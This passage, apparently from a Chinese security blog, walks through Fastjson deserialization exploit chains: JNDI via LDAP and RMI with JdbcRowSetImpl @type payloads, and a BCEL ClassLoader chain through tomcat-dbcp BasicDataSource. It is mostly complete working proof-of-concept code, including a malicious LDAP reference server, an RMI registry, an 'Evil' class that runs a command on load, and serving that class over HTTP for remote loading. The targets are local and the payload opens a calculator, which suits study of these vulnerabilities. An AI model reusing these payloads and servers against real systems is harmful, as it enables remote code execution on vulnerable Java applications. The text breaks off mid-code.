class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个利用javac编译为class文件，然后利用python起一个服务，记得起python服务的路径要和class文件路径一样不然读取不到class文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>然后起服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#test&quot;</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line">                    port,  </span><br><span class="line">                    ServerSocketFactory.getDefault(),  </span><br><span class="line">                    SocketFactory.getDefault(),  </span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line">            ds.startListening();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line">            &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击的exp，因为是自己本地起的服务所以在端口稍微不同，后面的remoteObj无所谓不为空就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138907.png" alt="image-20230821213817470"><br>这里也可以看到上面的报错是正常报错，和命令执行无关</p><h3 id="2-JNDI-RMI"><a href="#2-JNDI-RMI" class="headerlink" title="2.JNDI+RMI"></a>2.JNDI+RMI</h3><p>RMI攻击的exp把协议换一下就行，服务端不一样如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击的exp，rmi这里必须为remoteObj，rmi这块儿没学好，接口这里有点迷</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 基于 JdbcRowSetImpl 的利用链  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIPayload</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138821.png" alt="image-20230821213838383"><br>同样也可以利用工具marshalsec来起服务，但是我利用失败了就不演示了</p><h2 id="基于BCEL的利用链"><a href="#基于BCEL的利用链" class="headerlink" title="基于BCEL的利用链"></a>基于BCEL的利用链</h2><p>先看下BCEL是什么吧，然后把tomcat的依赖导进来后面会用到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>BCEL的全名是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，CC链也就是从<code>Apache Commons</code>产生的。</p><p>BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。主要用来将xml文档转为class文件。编译后的class被称为translet，可以在后续用于对XML文件的转换。该库已经内置在了JDK中。关于BCEL具体详情可参考<code>https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</code>。<br>这里先简单看下怎么利用BCEL来命令执行<br>BCEL中有一个类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，是一个ClassLoader，重写了<code>loadClass</code>方法。在<code>ClassLoader#loadClass()</code>中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139533.png" alt="image-20230821213912306"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139099.png" alt="image-20230821213938865"><br>然后用一个小Dome简单调试一下<br>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试Dome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException &#123;  </span><br><span class="line">        <span class="comment">//使用BCEL(Byte Code Engineering Library)的Repository类的lookupClass方法，  </span></span><br><span class="line">        <span class="comment">// 尝试从类路径中查找名为 &#x27;calc.class&#x27; 的类，并返回一个 JavaClass 对象。  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; 是 BCEL 提供的类，用于表示已加载的 Java 类。  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//使用 BCEL 提供的 &#x27;Utility&#x27; 类的 &#x27;encode&#x27; 方法，将字节码使用base64进行编码：  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; 返回表示 &#x27;calc.class&#x27; 字节码的字节数组；true表示编码过程中进行分割  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//创建了一个ClassLoader对象，调用其loadClass方法  </span></span><br><span class="line">        <span class="comment">//loadClass方法用于加载类，接收一个字符串参数表示要加载的类的名称  </span></span><br><span class="line">        <span class="comment">// (这里的类通过将&#x27;$$BCEL$$&#x27;字符串和变量&#x27;code&#x27;拼接得到),再通过调用.newInstance方法创建一个新的对象  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140749.png" alt="image-20230821213957427"><br>直接看下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140268.png" alt="image-20230821214024960"><br>命令执行的地方在<code>defineClass</code>即动态类加载，但进入这里首先<code>clazz</code>不能为null，此时如果<code>class_name</code>前几位为<code>$$BCEL$$</code>就会去执行<code>createClass</code>创建一个Classz这样就能来到<code>defineClass</code>加载到恶意类返回类的对象，在<code>newInstance()</code>的时候就会命令执行，那么现在就是找哪里能调用loadClass，最终是找到了<code>BasicDataSource</code>类，在<code>createConnectionFactory()</code>方法中会调用用forName其实底层就是调用loadClass（白日梦组长说的，具体没跟）<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140198.png" alt="image-20230821214040909"><br>然后就是看这两个变量可不可控，让ClassName为恶意的name，ClassLoad为上面Dome中的，在这里其实是有对应的setter和getter<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140823.png" alt="image-20230821214059194"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141349.png" alt="image-20230821214110741"><br>那么这两个变量可控现在看能不能调用到<code>createConnectionFactory()</code>方法，找到了<code>createDataSource()</code>方法，继续往上找<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141753.png" alt="image-20230821214124132"><br>最终在<code>getConnection()</code>中调用了<code>createDataSource()</code>方法，且为getter方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141100.png" alt="image-20230821214138477"></p><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>尝试构造一下exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//使用BCEL(Byte Code Engineering Library)的Repository类的lookupClass方法，  </span></span><br><span class="line">        <span class="comment">// 尝试从类路径中查找名为 &#x27;calc.class&#x27; 的类，并返回一个 JavaClass 对象。  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; 是 BCEL 提供的类，用于表示已加载的 Java 类。  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//使用 BCEL 提供的 &#x27;Utility&#x27; 类的 &#x27;encode&#x27; 方法，将字节码使用base64进行编码：  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; 返回表示 &#x27;calc.class&#x27; 字节码的字节数组；true表示编码过程中进行分割  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();  </span><br><span class="line">        dataSource.setDriverClassLoader(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());  </span><br><span class="line">        dataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">        dataSource.getConnection();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142301.png" alt="image-20230821214200048"><br>成功执行，现在换成<code>@type</code>形式的就OK了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//使用BCEL(Byte Code Engineering Library)的Repository类的lookupClass方法，  </span></span><br><span class="line">        <span class="comment">// 尝试从类路径中查找名为 &#x27;calc.class&#x27; 的类，并返回一个 JavaClass 对象。  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; 是 BCEL 提供的类，用于表示已加载的 Java 类。  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//使用 BCEL 提供的 &#x27;Utility&#x27; 类的 &#x27;encode&#x27; 方法，将字节码使用base64进行编码：  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; 返回表示 